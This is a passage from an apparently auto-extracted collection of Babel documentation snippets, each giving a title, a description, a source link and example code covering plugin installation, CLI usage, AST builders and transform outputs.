file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-explicit-resource-management.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-explicit-resource-management script.js\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Await example with F# Pipeline\nDESCRIPTION: This snippet demonstrates how `await` is handled in the F# pipeline operator. It fetches data from a URL, parses it as JSON, and extracts the `ID` property, using arrow functions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = fetch(url)\n  |> await\n  |> r => r.json()\n  |> await\n  |> obj => obj.ID;\n\n```\n\n----------------------------------------\n\nTITLE: Transform Class Properties - Output with Spec (JavaScript)\nDESCRIPTION: This snippet shows the output JavaScript code after transforming class properties with the `spec` option enabled. It uses `Object.defineProperty` to define and initialize both static and instance properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Foo = function Foo() {\n  babelHelpers.classCallCheck(this, Foo);\n  _initialiseProps.call(this);\n};\n\nObject.defineProperty(Foo, \"bar\", {\n  enumerable: true,\n  writable: true,\n  value: undefined\n});\n\nvar _initialiseProps = function () {\n  Object.defineProperty(this, \"bar\", {\n    enumerable: true,\n    writable: true,\n    value: foo\n  });\n};\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: This command demonstrates how to run Babel from the command line, specifying the transform-merge-sibling-variables plugin.  It transforms the input file 'script.js' using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-merge-sibling-variables.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-merge-sibling-variables script.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM/Yarn\nDESCRIPTION: This shell command shows how to install the `@babel/plugin-transform-export-namespace-from` plugin as a development dependency using npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-export-namespace-from.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-export-namespace-from\n```\n\n----------------------------------------\n\nTITLE: Using Object Assign Plugin via CLI\nDESCRIPTION: Example command-line usage demonstrating how to transform a JavaScript file using the @babel/plugin-transform-object-assign plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-assign.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-object-assign script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a TSInferType Node in JavaScript\nDESCRIPTION: This code creates a `TSInferType` AST node using the `t.tsInferType` builder function.  It takes a `TSTypeParameter` as an argument. This node represents an inferred type in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_180\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsInferType(typeParameter);\n```\n\n----------------------------------------\n\nTITLE: Importing Core-js 2 in Main File\nDESCRIPTION: Imports core-js polyfills for Promise and array iterator (es6) within the main JavaScript file. This ensures that environments without native Promise support can use dynamic imports when working with Webpack and @babel/preset-env and core-js version 2.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport \"core-js/modules/es6.promise\";\nimport \"core-js/modules/es6.array.iterator\";\n\n// ...\n```\n\n----------------------------------------\n\nTITLE: Export Extensions Usage with Babel CLI Shell\nDESCRIPTION: Shows how to enable export extensions in Babel using the command-line interface (CLI) with the `--optional` or `--stage` flags. It demonstrates two equivalent CLI commands for enabling the feature when transpiling a script.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --optional es7.exportExtensions script.js\n# or\n$ babel --stage 1 script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a DebuggerStatement AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.debuggerStatement` to create a debugger statement node in the AST.  It takes no arguments and represents the `debugger` statement in JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_31\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.debuggerStatement();\n```\n\n----------------------------------------\n\nTITLE: Google Closure Compiler Type Cast Example JavaScript\nDESCRIPTION: Shows an example of how Google Closure Compiler uses parentheses for type cast expressions. Babel now tracks parentheses when the `createParenthesizedExpressions` parser option is enabled, allowing better integration with tools like Closure Compiler.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @type {!MyType} */ (valueExpression)\n```\n\n----------------------------------------\n\nTITLE: Checking for ForXStatement Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a `ForInStatement` or `ForOfStatement`. It uses the `t.isForXStatement(node)` method from Babel's `types` API. This is useful for specifically identifying `ForInStatement` and `ForOfStatement` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_272\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isForXStatement(node);\n```\n\n----------------------------------------\n\nTITLE: Configuration File Example (JSON - without options)\nDESCRIPTION: Demonstrates how to include the babel-plugin-minify-replace plugin in a Babel configuration file without any specific options. This is a simple configuration to enable the plugin with default settings.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-replace\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Object Keyword\nDESCRIPTION: Creates a TypeScript `object` keyword node in the AST. Represents the `object` type in TypeScript.  It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_197\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsObjectKeyword();\n```\n\n----------------------------------------\n\nTITLE: JSX Transformation with Runtime Helper\nDESCRIPTION: This code shows how Babel transforms JSX with spread properties by default, injecting a runtime helper function `_extends`. The helper function merges the properties of the spread object into the element's attributes.  Requires `@babel/plugin-transform-react-jsx` or `@babel/preset-react`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<a x {...y} />\n\n// 🡇 🡇 🡇\n\nfunction _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nReact.createElement(\"a\", _extends({\n  x: true\n}, y));\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-proposal-decorators (Shell)\nDESCRIPTION: Command to install the @babel/plugin-proposal-decorators plugin using npm.  This installs the plugin as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-decorators\n```\n\n----------------------------------------\n\nTITLE: Transformed React JSX Output (output.js)\nDESCRIPTION: Shows the output of the @babel/plugin-transform-react-jsx-development plugin, transforming the JSX code into standard JavaScript code that uses react/jsx-dev-runtime to create React elements.  The transformation includes additional metadata for debugging, such as file name and line numbers.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\n\nconst _jsxFileName = \"input.jsx\";\nconst profile = _jsxDEV(\"div\", {\n  children: [\n    _jsxDEV(\"img\", {\n      src: \"avatar.png\",\n      className: \"profile\",\n    }, undefined, false, { fileName: _jsxFileName, lineNumber: 3, columnNumber: 5 }, this),\n    _jsxDEV(\"h3\", {\n      children: [user.firstName, user.lastName].join(\" \"),\n    }, undefined, false, { fileName: _jsxFileName, lineNumber: 4, columnNumber: 5 }, this),\n  ]},\n  undefined, false, { fileName: _jsxFileName, lineNumber: 2, columnNumber: 3 }, this\n);\n```\n\n----------------------------------------\n\nTITLE: Transpiling to ES6/ES2015 with useUnicodeFlag option\nDESCRIPTION: This JavaScript snippet demonstrates how to transpile to ES6/ES2015 and disable the `useUnicodeFlag` option of the @babel/plugin-transform-unicode-property-regex plugin. Disabling `useUnicodeFlag` converts Unicode regexes to non-Unicode regexes for broader compatibility.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-property-regex.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(code, {\n  plugins: [\n    [\n      \"@babel/plugin-transform-unicode-property-regex\",\n      { useUnicodeFlag: false },\n    ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node.js API - JavaScript\nDESCRIPTION: Transforms JavaScript code using the `@babel/plugin-transform-dotall-regex` plugin via the Babel Node.js API.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dotall-regex.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(code, {\n  plugins: [\"@babel/plugin-transform-dotall-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configure babel-plugin-minify-simplify - JSON\nDESCRIPTION: This JSON configuration enables the `minify-simplify` plugin within a Babel project.  It adds the plugin to the `plugins` array in the `babel.config.json` file, making it active for all transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-simplify.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-simplify\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed Reserved Words: JavaScript Example\nDESCRIPTION: This is the output of the Babel plugin applied to the previous JavaScript code snippet. The `abstract` variable is renamed to `_abstract`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-reserved-words.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _abstract = 1;\nvar x = _abstract + 1;\n```\n\n----------------------------------------\n\nTITLE: Passing Options to Babelify via CLI (Shell)\nDESCRIPTION: This command shows how to pass options to Babelify via the command line. The `-d` flag enables debug mode, `-e` specifies the entry point, and `-t` is used to apply babelify with the option `--comments false`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/usage.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbrowserify -d -e script.js -t [ babelify --comments false ]\n```\n\n----------------------------------------\n\nTITLE: Annotate as Pure Input JavaScript\nDESCRIPTION: Shows an example of input JavaScript code before annotation. This code defines a constant `four` which is initialized with the result of the `add` function.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-annotate-as-pure.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst four = /* foo */ add(2, 2);\n```\n\n----------------------------------------\n\nTITLE: Updating ClassDeclaration superTypeParameters to superTypeArguments in Babel 8 (TS)\nDESCRIPTION: This snippet illustrates the change in the AST representation of class inheritance with type parameters in Babel 8. The `superTypeParameters` property in Babel 7 is renamed to `superTypeArguments` in Babel 8, reflecting a more accurate description of its purpose.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_40\n\nLANGUAGE: typescript\nCODE:\n```\nclass X extends Y<string> {}\n\n// AST in Babel 7\n{\n  type: \"ClassDeclaration\",\n  id: Identifier(\"X\"),\n  superClass: Identifier(\"Y\"),\n  superTypeParameters: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n\n// AST in Babel 8\n{\n  type: \"ClassDeclaration\",\n  id: Identifier(\"X\"),\n  superClass: Identifier(\"Y\"),\n  superTypeArguments: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Import Babel Register in JavaScript\nDESCRIPTION: This snippet demonstrates how to use `import` to load `@babel/register`.  This will transpile all subsequent `.es6`, `.es`, `.jsx`, and `.js` files required by Node.js. It should be included at the top of the application's entry point to ensure it's loaded first.  Requires ES6 module support.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_register/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"@babel/register\";\n```\n\n----------------------------------------\n\nTITLE: Creating a VoidTypeAnnotation with Babel\nDESCRIPTION: Creates a `VoidTypeAnnotation` AST node using the `t.voidTypeAnnotation` method. This node represents a `void` type annotation in Flow.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_249\n\nLANGUAGE: javascript\nCODE:\n```\nt.voidTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareExportDeclaration AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareExportDeclaration` to create a declare export declaration node in the AST for Flow type annotations.  It allows declaring the export of a Flow type, specifiers, source, and attributes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_35\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareExportDeclaration(declaration, specifiers, source, attributes);\n```\n\n----------------------------------------\n\nTITLE: JSX Transformation with Object.assign\nDESCRIPTION: This code shows the JSX transformation when the `useBuiltIns` option is enabled in `@babel/plugin-transform-react-jsx`. It uses `Object.assign` directly instead of injecting a custom helper, resulting in slightly cleaner code. Requires `@babel/plugin-transform-react-jsx` or `@babel/preset-react` and the `useBuiltIns` option set to `true`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<a x {...y} />\n\n// 🡇 🡇 🡇\n\nReact.createElement(\"a\", Object.assign({\n  x: true\n}, y));\n```\n\n----------------------------------------\n\nTITLE: Manual Binding in ES6 React Components\nDESCRIPTION: Demonstrates the need to manually bind methods to the component instance in ES6 class components when not using React.createClass.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n// Manually bind, wherever you need to\nclass PostInfo extends React.Component {\n  constructor(props) {\n    super(props);\n    // Manually bind this method to the component instance...\n    this.handleOptionsButtonClick = this.handleOptionsButtonClick.bind(this);\n  }\n  handleOptionsButtonClick(e) {\n    // ...to ensure that 'this' refers to the component instance here.\n    this.setState({showOptionsModal: true});\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Splitting TSMappedType typeParameter in Babel 8 (TS)\nDESCRIPTION: This snippet showcases the flattening of the `typeParameter` property in `TSMappedType` nodes. In Babel 7, `typeParameter` was a nested object containing `name` and `constraint`. In Babel 8, `name` becomes the `key` property and `constraint` becomes a direct property of `TSMappedType`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_41\n\nLANGUAGE: typescript\nCODE:\n```\nlet map1: { [P in string]: number; };\n\n// AST in Babel 7\n{\n  type: \"TSMappedType\",\n  typeParameter: {\n    type: \"TypeParameter\",\n    name: Identifier(\"P\"),\n    constraint: TSStringKeyword()\n  },\n  typeAnnotation: TSNumberKeyword(),\n}\n\n// AST in Babel 8\n{\n  type: \"TSMappedType\",\n  key: Identifier(\"P\"),\n  constraint: TSStringKeyword()\n  typeAnnotation: TSNumberKeyword(),\n}\n```\n\n----------------------------------------\n\nTITLE: Transform for-of Loop with loose mode (Output)\nDESCRIPTION: This JavaScript code is the result of transforming the for-of loop with the 'loose' option enabled.  It uses Array.isArray to determine if the iterable is an array and then uses a basic `for` loop for iteration, offering increased performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nfor (\n  var _iterator = foo,\n    _isArray = Array.isArray(_iterator),\n    _i = 0,\n    _iterator = _isArray ? _iterator : _iterator[Symbol.iterator]();\n  ;\n\n) {\n  var _ref;\n\n  if (_isArray) {\n    if (_i >= _iterator.length) break;\n    _ref = _iterator[_i++];\n  } else {\n    _i = _iterator.next();\n    if (_i.done) break;\n    _ref = _i.value;\n  }\n\n  var i = _ref;\n}\n```\n\n----------------------------------------\n\nTITLE: babel-loader Webpack configuration example in JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to configure `babel-loader` in a Webpack configuration file. It shows how to specify the loader and its options using the `options` object, replacing the deprecated query parameters approach.  The example includes setting the `@babel/preset-env` preset.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-10-27-7.20.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n    loader: \"babel-loader\",\n    options: {\n        presets: [\"@babel/preset-env\"]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Class Implements (JavaScript)\nDESCRIPTION: Creates a `ClassImplements` AST node. This node represents a class implementing an interface. Parameters include the identifier (`id`) representing the implemented interface, and optional type parameters (`typeParameters`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_24\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classImplements(id, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Babel Code Frame Options JavaScript\nDESCRIPTION: Shows an example of the output from `babel-code-frame` with default `linesBefore` and `linesAfter` options. `babel-code-frame` is used by Babel to show the context around errors.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\n  1 | class Foo {\n> 2 |   constructor()\n    |                ^\n  3 | }\n```\n\n----------------------------------------\n\nTITLE: Creating EnumDefaultedMember in JavaScript\nDESCRIPTION: This snippet shows how to create an `EnumDefaultedMember` AST node with Babel's `t.enumDefaultedMember` method. The `id` parameter, which is required, should be an `Identifier` node and it represents the name of the enum member. This type of member is typically used when the enum value is implicitly assigned.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_54\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumDefaultedMember(id);\n```\n\n----------------------------------------\n\nTITLE: Flow Comma Separator Example (JavaScript)\nDESCRIPTION: Illustrates the two supported syntaxes for Flow object types, using either commas or semicolons as separators.  The `flowCommaSeparator` option configures which syntax the generator uses.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a: { param1: number; param2: string }\nvar a: { param1: number, param2: string }\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin via babel.config.json\nDESCRIPTION: This JSON configuration shows how to enable the transform-merge-sibling-variables plugin in a Babel project using the babel.config.json file.  The plugin is added to the 'plugins' array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-merge-sibling-variables.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-merge-sibling-variables\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Plugin via npm/yarn\nDESCRIPTION: Installs the @babel/plugin-syntax-import-defer plugin as a development dependency using npm or yarn. This allows Babel to parse `import defer` declarations. The command is compatible with both npm and yarn package managers.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-defer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-import-defer\n```\n\n----------------------------------------\n\nTITLE: TypeScript Const Type Parameters\nDESCRIPTION: This TypeScript code demonstrates the `const` modifier for type parameters introduced in TypeScript 5.0. It allows the compiler to infer more specific types for generic parameters, leading to improved type checking and code analysis. The function `getName` infers the string literal type of the `name` property.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_6\n\nLANGUAGE: TypeScript\nCODE:\n```\nfunction getName<const T extends { name: string }>(user: T): T[\"name\"] {\n    return user.name;\n}\n\nlet name = getName({ name: \"Babel\" });\n//  ^? inferred type: \"Babel\", instead of just string.\n```\n\n----------------------------------------\n\nTITLE: Make expression uniform - JavaScript\nDESCRIPTION: This example showcases how `babel-plugin-minify-simplify` normalizes JavaScript expressions to enhance compressibility. It transforms expressions like `undefined`, `foo['bar']`, and `Number(foo)` into more uniform representations such as `void 0`, `foo.bar`, and `+foo` respectively.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-simplify.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nundefined\nfoo['bar']\nNumber(foo)\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvoid 0\nfoo.bar\n+foo\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeParameterInstantiation Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypeParameterInstantiation` AST node using Babel's `t.tsTypeParameterInstantiation` method. It takes an array of `TSType` nodes as its arguments, representing the type parameters being instantiated.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_217\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeParameterInstantiation(params);\n```\n\n----------------------------------------\n\nTITLE: Create If Statement AST Node (JavaScript)\nDESCRIPTION: Creates an `IfStatement` AST node using the `t.ifStatement` builder. This node represents an if statement. Parameters include the test condition, the consequent statement, and the alternate statement (else block).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_78\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.ifStatement(test, consequent, alternate);\n```\n\n----------------------------------------\n\nTITLE: Creating Noop in JavaScript\nDESCRIPTION: This snippet creates a `Noop` AST node using Babel's `t.noop` builder. It takes no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_115\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.noop();\n```\n\n----------------------------------------\n\nTITLE: Example ES2015 code before Babili minification\nDESCRIPTION: This code example demonstrates the original ES2015 code prior to minification using Babili. It defines a simple class `Mangler` with a constructor and creates an instance of the class. This represents the input to the minification process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Mangler {\n  constructor(program) {\n    this.program = program;\n  }\n}\nnew Mangler();\n```\n\n----------------------------------------\n\nTITLE: Transform function.sent JavaScript\nDESCRIPTION: This plugin compiles the `function.sent` meta property, which is used inside generator functions. It transforms the `function.sent` keyword into a compatible implementation for older JavaScript environments.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction* generator() {\n    console.log(\"Sent\", function.sent);\n    console.log(\"Yield\", yield);\n}\n\nconst iterator = generator();\niterator.next(1); // Logs \"Sent 1\"\niterator.next(2); // Logs \"Yield 2\"\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet generator = _skipFirstGeneratorNext(function* () {\n    const _functionSent = yield;\n    console.log(\"Sent\", _functionSent);\n    console.log(\"Yield\", yield);\n});\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Intrinsic Keyword\nDESCRIPTION: Creates a TypeScript intrinsic keyword node in the AST.  This represents TypeScript's built-in primitive types, such as `string`, `number`, `boolean`, etc.  It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_185\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsIntrinsicKeyword();\n```\n\n----------------------------------------\n\nTITLE: Creating a WithStatement with Babel\nDESCRIPTION: Creates a `WithStatement` AST node using the `t.withStatement` method. This node represents a `with` statement, where `object` is the object to add to the scope, and `body` is the statement to execute.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_251\n\nLANGUAGE: javascript\nCODE:\n```\nt.withStatement(object, body);\n```\n\n----------------------------------------\n\nTITLE: TypeScript import/export statements transpiled (JavaScript)\nDESCRIPTION: Shows the transpiled JavaScript output of the TypeScript `import ... = require(...)` and `export = { ... }` syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nconst A = require(\"./a\");\n\nmodule.exports = { x: 2 };\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Expression Container in JavaScript\nDESCRIPTION: This snippet creates a `JSXExpressionContainer` AST node using Babel's `t.jsxExpressionContainer` builder.  The `expression` parameter should be an `Expression` or `JSXEmptyExpression`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_98\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxExpressionContainer(expression);\n```\n\n----------------------------------------\n\nTITLE: JavaScript Edge 16 Bug Example\nDESCRIPTION: Illustrates a JavaScript code snippet that breaks in Edge 16 due to a bug related to parsing shorthand destructured parameters with default values within arrow functions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// this breaks in Edge 16:\nconst foo = ({ a = 1 }) => {};\n\n// .. but this doesn't:\nfunction foo({ a = 1, b }, ...args) {}\n\n// ... and neither does this:\nconst foo = ({ a: a = 1 }) => {};\n```\n\n----------------------------------------\n\nTITLE: Template Literal Usage with Placeholders in @babel/template (JavaScript)\nDESCRIPTION: This snippet shows how to use @babel/template with template literals and placeholders. It defines a template for a require statement and then uses it to create an AST. The generated code is then logged to the console. Requires @babel/template, @babel/generator, and @babel/types.\nSOURCE: https://github.com/babel/website/blob/main/docs/template.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport template from \"@babel/template\";\nimport { generate } from \"@babel/generator\";\nimport * as t from \"@babel/types\";\n\nconst source = \"my-module\";\n\nconst fn = template`\n  var IMPORT_NAME = require('${source}');\n`;\n\nconst ast = fn({\n  IMPORT_NAME: t.identifier(\"myModule\"),\n});\n\nconsole.log(generate(ast).code);\n```\n\n----------------------------------------\n\nTITLE: Manipulating Module Cache JavaScript\nDESCRIPTION: This demonstrates how to directly access and manipulate the module cache using `System.get` and `System.set`. It retrieves the module associated with \"jquery\", then sets the \"jquery\" module with a new `Module` instance. Requires the System module loader and relies on the global `$`. The API is marked as not yet finalized.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Directly manipulate module cache\nSystem.get(\"jquery\");\nSystem.set(\"jquery\", Module({$: $})); // WARNING: not yet finalized\n```\n\n----------------------------------------\n\nTITLE: Defining a Class with Private Instance Methods in JavaScript\nDESCRIPTION: This code demonstrates how to define a class with private instance methods in JavaScript using the `#` prefix.  It requires the `@babel/plugin-proposal-private-methods` plugin or the `stage-3` preset in Babel to be properly transpiled.  The `birthday` method calls the private `#increaseAge` method internally.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-12-03-7.2.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  #age = 19;\n\n  #increaseAge() {\n    this.#age++;\n  }\n\n  birthday() {\n    this.#increaseAge();\n    alert(\"Happy Birthday!\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Invalid TypeScript Abstract Class Field Declaration\nDESCRIPTION: This TypeScript code snippet demonstrates a syntax error related to abstract class field declarations. TypeScript 4.4 introduces a restriction preventing the specification of a value for an abstract class field. The code snippet illustrates this syntax error, highlighting a change in TypeScript's type system.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-07-26-7.15.0.md#_snippet_1\n\nLANGUAGE: TypeScript\nCODE:\n```\nabstract class C {\n    abstract prop = 1; // now a SyntaxError!\n}\n```\n\n----------------------------------------\n\nTITLE: Type Constructor Minification Example - JavaScript\nDESCRIPTION: Demonstrates how the `babel-plugin-minify-type-constructors` plugin transforms type constructor calls into shorter, equivalent expressions.  `Boolean(x)` becomes `!!x`, `Number(x)` becomes `+x`, `String(x)` becomes `x + \"\"`, `Array(3)` becomes `[,,,]`, `Array(3,1)` becomes `[3, 1]`, and `Object({foo: 'bar'})` becomes `{foo: 'bar'}`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-type-constructors.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nBoolean(x);\nNumber(x);\nString(x);\nArray(3);\nArray(3,1);\nObject({foo: 'bar'});\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n!!x;\n+x;\nx + \"\";\n[,,,];\n[3, 1];\n{foo: 'bar'};\n```\n\n----------------------------------------\n\nTITLE: Creating EnumDeclaration in JavaScript\nDESCRIPTION: This snippet demonstrates how to create an `EnumDeclaration` AST node using Babel's `t.enumDeclaration` method. The `id` parameter is a required `Identifier` representing the enum's name, and `body` is a required `EnumBooleanBody`, `EnumNumberBody`, `EnumStringBody`, or `EnumSymbolBody` representing the enum's content. This declaration defines a new enum type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_53\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumDeclaration(id, body);\n```\n\n----------------------------------------\n\nTITLE: Create Inferred Predicate AST Node (JavaScript)\nDESCRIPTION: Creates an `InferredPredicate` AST node using the `t.inferredPredicate()` builder.  This node represents an inferred predicate in Flow.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_87\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.inferredPredicate();\n```\n\n----------------------------------------\n\nTITLE: Installing babel-node-debug Globally with npm\nDESCRIPTION: This command installs the 'babel-node-debug' package globally using npm. This allows the package to be used from any directory on the system. The '-g' flag specifies that the package should be installed globally. This is likely part of the setup for debugging Babel projects.\nSOURCE: 